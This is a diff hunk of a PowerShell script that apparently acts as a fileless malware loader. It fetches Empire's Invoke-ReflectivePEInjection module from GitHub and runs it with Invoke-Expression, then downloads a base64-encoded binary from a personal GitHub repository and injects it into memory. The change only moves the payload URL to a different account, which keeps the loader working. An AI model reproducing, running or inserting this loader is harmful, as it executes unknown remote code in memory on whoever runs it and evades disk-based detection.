@@ -13,7 +13,7 @@ try {
     $l = $wc.DownloadString("https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/management/Invoke-ReflectivePEInjection.ps1")
     Invoke-Expression $l
 
-    $b = $wc.DownloadString("https://raw.githubusercontent.com/neight01/johannesschwein/refs/heads/main/johannesschwein.txt")
+    $b = $wc.DownloadString("https://raw.githubusercontent.com/spritezerosugar67/johannesschwein/refs/heads/main/johannesschwein.txt")
     $rb = [System.Convert]::FromBase64String($b)
 
     Invoke-ReflectivePEInjection -PEBytes $rb -ForceASLR
